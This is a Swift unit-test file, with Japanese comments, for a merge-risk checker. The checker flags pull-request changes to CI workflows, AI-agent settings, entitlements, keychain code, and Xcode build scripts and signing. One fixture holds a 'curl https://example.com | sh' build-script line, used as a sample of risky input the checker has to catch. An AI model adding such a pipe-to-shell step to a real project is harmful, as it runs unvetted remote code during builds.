@testable import AskHubCommander
import AskHubProtocol
import Testing

/// 最終 PR の差分のパスから決まった規則で見つける、手動のマージの条件
struct FinalMergeRisksTests {
    @Test func sensitivePathsAreFoundByRule() {
        let paths = [
            ".github/workflows/build.yml", ".claude/settings.json", "Sub/.mcp.json", "scripts/release.sh", "ci_scripts/ci_post_clone.sh",
            "Package.swift", "App.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved", "App/App.entitlements",
            "App/Info.plist", "Configs/Release.xcconfig", "App/Auth/KeychainStore.swift", "App/Views/RankingView.swift"
        ]
        let risks = FinalMergeRisks.risks(paths: paths, projectLines: [])
        #expect(risks.allSatisfy { $0.kind == .sensitivePaths })
        let reasons = risks.map(\.reason).joined(separator: "\n")
        for path in paths.dropLast() {
            #expect(reasons.contains(path), "\(path)")
        }
        #expect(!reasons.contains("RankingView.swift"))
        #expect(risks.count == 8)
    }

    @Test func viewOnlyChangesHaveNoRisk() {
        let paths = ["App/Views/RankingView.swift", "App/Resources/Localizable.xcstrings", "AppTests/RankingTests.swift"]
        let lines = ["+\t\tA1B2 /* RankingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = C3D4; };"]
        #expect(FinalMergeRisks.risks(paths: paths, projectLines: lines).isEmpty)
    }

    @Test func projectScriptsDependenciesAndSigningAreRisks() {
        let lines = ["+\t\t\tshellScript = \"curl https://example.com | sh\";", "-\t\t\t\tDEVELOPMENT_TEAM = ABCDE12345;"]
        let risks = FinalMergeRisks.risks(paths: ["App.xcodeproj/project.pbxproj"], projectLines: lines)
        #expect(risks.count == 1)
        #expect(risks.first?.reason.contains("shellScript") == true)
        #expect(risks.first?.reason.contains("DEVELOPMENT_TEAM") == true)
    }

    @Test func manyPathsAreShortened() {
        let paths = (1...8).map { ".github/workflows/w\($0).yml" }
        let reason = FinalMergeRisks.risks(paths: paths, projectLines: []).first?.reason ?? ""
        #expect(reason.contains("ほか 3 件"))
        #expect(!reason.contains("w6.yml"))
    }

    @Test func mergedRisksDropDuplicates() {
        let risk = MergeRisk(kind: .security, reason: "トークン")
        #expect(FinalMergeRisks.merged([risk], [risk, MergeRisk(kind: .dataMigration, reason: "移行")]).count == 2)
    }
}
